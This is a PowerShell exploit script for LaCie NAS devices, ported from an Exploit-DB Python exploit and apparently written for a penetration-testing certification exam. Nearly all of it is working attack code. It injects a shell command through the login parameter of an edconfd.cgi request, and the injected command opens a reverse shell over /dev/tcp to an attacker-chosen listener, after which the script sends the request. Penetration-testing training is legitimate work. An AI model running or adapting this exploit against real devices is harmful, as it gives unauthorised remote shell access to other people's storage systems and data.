function Command-Inject-LACIE
{ 

<#
.SYNOPSIS
This exploit is from exploitdb https://www.exploit-db.com/exploits/43226/ and is a port of Timo Sablowski python version to powershell.

.DESCRIPTION
This has been ported from python to powershell based on the code from  https://www.exploit-db.com/exploits/43226/.
Credit goes to Timo Sablowski for the python code and also finding the vulnerability.

.PARAMETER baseurl
The baseurl, which inlcudes the protocol, IP Address or host name, and port of the LaCie to exploit.
For example https://host.com:8443/

.PARAMETER listner
The IP Address or host name of the server running netcat for the connect back.

.PARAMETER port
The port that the reverse connection should connect to.

.EXAMPLE

PS C:> Command-Inject-LACIE -baseurl https://10.0.0.1:8443 -listner 192.168.1.1 -port 8080

.LINK


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237


#>
    [CmdletBinding()]
    Param (
    
        [Parameter(Mandatory=$true)]
        [String]
        $baseurl = $Null,

        [Parameter(Mandatory=$true)]
        [String]
        $listner = $Null,

        [Parameter(Mandatory=$true)]
        [String]
        $port = $Null        
        
        
    )

    # Pause function from Jerry G at stack overflow
    # https://stackoverflow.com/questions/20886243/press-any-key-to-continue
    Function pause ($message)
        {
        # Check if running Powershell ISE
        if ($psISE)
        {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show("$message")
        }
        else
        {
            Write-Host "$message" -ForegroundColor Yellow
            $x = $host.ui.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    }


    if( ($baseurl -eq $Null) -or ($listner -eq $Null) -or ($port -eq $Null) ) {

        Write-Warning "[-] Error parameters not correct"
        break
    } else {
        Write-Host "[+] Generating URL to send to LaCie"
    }

    # url's from original exploit code
    $url_addition = $baseurl+"/cgi-bin/public/edconfd.cgi?method=getChallenge&login="
    $blank_payload = "admin|#' ||``/bin/sh -i > /dev/tcp/$listner/$port 0<&1 2>&1`` #\\"""
    
    # Need to encode special charaters, thanks to Prateik Singh
    # https://geekeefy.wordpress.com/2017/05/26/encodedecode-your-url-with-powershell/
    Add-Type -AssemblyName System.Web
    $blank_payload = [System.Web.HttpUtility]::UrlEncode($blank_payload)

    $url = $url_addition+$blank_payload
    pause "[+] About to send exploit, ensure listner is running, press any key to continue"
  
    try{
           
           Write-Host "[+] Url to send: $url"
           Invoke-WebRequest $url -OutFile "file" -PassThru | Select-Object -ExpandProperty Content
           Write-Host "[+] URL sent, check listner"
        }catch{
            Write-Error "[-] Error response from host: $Error[0]"
    }

}